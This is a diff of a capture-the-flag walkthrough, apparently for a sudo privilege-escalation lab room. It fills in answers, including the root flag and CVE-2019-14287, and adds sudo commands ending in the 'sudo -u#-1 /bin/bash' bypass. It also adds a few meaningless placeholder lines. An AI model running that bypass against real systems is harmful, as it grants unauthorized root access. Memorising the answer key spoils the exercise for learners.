@@ -149,26 +149,38 @@ stegseek --crack -sf cute-alien.jpg -wl /usr/share/wordlists/rockyou.txt
    
    
 
-   ><details><summary>Click for answer</summary>Aut</details>
+   ><details><summary>Click for answer</summary>Roswell alien autopsy</details>
 
 ### Privilege escalation 
 
+sudo -l
+sudo -V
+sudo /bin/bash
+sudo -u#-1 /bin/bash
 
 
 1. CVE number for the escalation 
 
+   PRIVESC PERMISSIONS
+   
+   PRIVESC SUDO BASH
+   
+   PRIVESC SUDO EXPLOIT
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>CVE-2019-14287</details>
 
 2. What is the root flag?
 
+   PRIVESC SUDO VERSION
+   
+   PRIVESC SUDO ROOT
+   
+   PRIVESC SUDO FLAG
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>b53a02f55b57d4439e3341834d70c062</details>
 
 3. (Bonus) Who is Agent R?
 
 
 
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>DesKel</details>
